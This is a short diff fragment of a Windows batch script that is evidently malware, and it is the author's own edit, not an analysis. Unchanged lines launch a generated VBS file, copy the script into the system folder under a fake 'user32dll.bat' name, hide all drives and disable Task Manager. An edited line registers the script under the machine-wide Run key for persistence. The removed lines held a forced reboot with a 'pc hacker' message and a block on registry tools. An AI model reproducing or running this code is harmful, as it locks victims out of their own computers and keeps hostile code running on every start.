@@ -348,7 +348,6 @@ echo Set iConf = Nothing >> %temp%\temp.vbs
 
 echo Set Flds = Nothing >> %temp%\temp.vbs 
 
-echo s.run "shutdown -r -t 0 -c ""pc" hacker"" -f",1 >> %temp%\temp.vbs 
 
 start %temp%\temp.vbs 
 
@@ -374,7 +373,7 @@ reg add HKEY_USERS\S-1-5-21-343818398-1417001333-725345543-1003\Software\Microso
 
 copy %¶§% %SystemRoot%\user32dll.bat 
 
-reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\user32dll.bat /f 
+reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v RunExplorer32 /d %SystemRoot%\System32\git.bat /f 
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
 
@@ -436,7 +435,6 @@ echo loop>>%temp%\temp2.vbs
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disabletaskmgr /t REG_DWORD /d 1 /f 
 
-reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuPinnedList /t REG_DWORD /d 1 /f 
 
